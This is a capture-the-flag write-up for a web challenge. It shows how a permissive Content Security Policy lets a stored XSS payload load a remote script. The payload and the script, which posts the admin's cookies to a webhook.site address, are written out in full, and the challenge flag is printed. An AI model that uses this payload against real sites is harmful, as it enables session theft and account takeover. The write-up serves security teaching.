# Challenge `Read my lips: no more scripts` writeup

- Vulnerability: XSS
- Where: In the post creation form's content field
- Impact: It allows the retrieval of a remote user's (in this case, the admin's) cookies

## Finding the vulnerability / Steps to reproduce

1. This challenge is similar to `Go on and censor my posts`, except that, in this website, inline scripts are ignored as a result of the `script-src *` Content Security Policy. However, this policy also means that non-inline scripts can be read from any origin.
2. As such, an attacker can create a similar payload to the last challenge (`</textarea><script type="text/javascript" src="http://web.tecnico.ulisboa.pt/ist195550/exploit.js"></script><textarea>`), this time with a reference to an online JavaScript file with the exact same script content as before (`const xhr = new XMLHttpRequest(); xhr.open("POST", "https://webhook.site/<id>", false); xhr.send(document.cookie);`).
3. Once the script is finally submitted for approval and the admin clicks on it, a request containing the flag (`SSof{Loading_R3m0t3_Scripts_is_allowed_with_this_CSP}`) is then intercepted and can be read by the attacker.